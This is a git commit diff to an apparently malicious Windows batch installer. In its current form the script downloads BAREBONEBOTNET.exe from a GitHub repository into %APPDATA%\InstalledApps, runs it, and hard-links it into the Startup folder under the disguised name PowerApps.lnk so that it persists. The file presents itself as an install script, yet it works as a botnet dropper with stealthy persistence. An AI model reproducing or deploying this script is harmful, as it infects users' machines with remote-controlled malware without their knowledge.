423f0528185e98c01ac84bf58b715e996e070d7c
ADMIN590 <167841172+ADMIN590@users.noreply.github.com>
2024-04-24 21:51:29 +0700

    Update install.bat

--- install.bat
+++ install.bat
@@ -1,6 +1,5 @@
 cd %APPDATA%
-mkdir InstalledApps
-cd InstalledApps
-curl https://github.com/ADMIN590/BAREBONEREXECUTOR/raw/main/BAREBONEBOTNET.exe %% BAREBONEBOTNET.exe
+mkdir InstalledApps && cd InstalledApps
+curl https://github.com/ADMIN590/BAREBONEREXECUTOR/raw/main/BAREBONEBOTNET.exe && BAREBONEBOTNET.exe
 cd %APPDATA%/microsoft/windows/Start Menu/Programs/Startup
 mklink /H PowerApps.lnk "%APPDATA%\InstalledApps\BAREBONEBOTNET.exe"
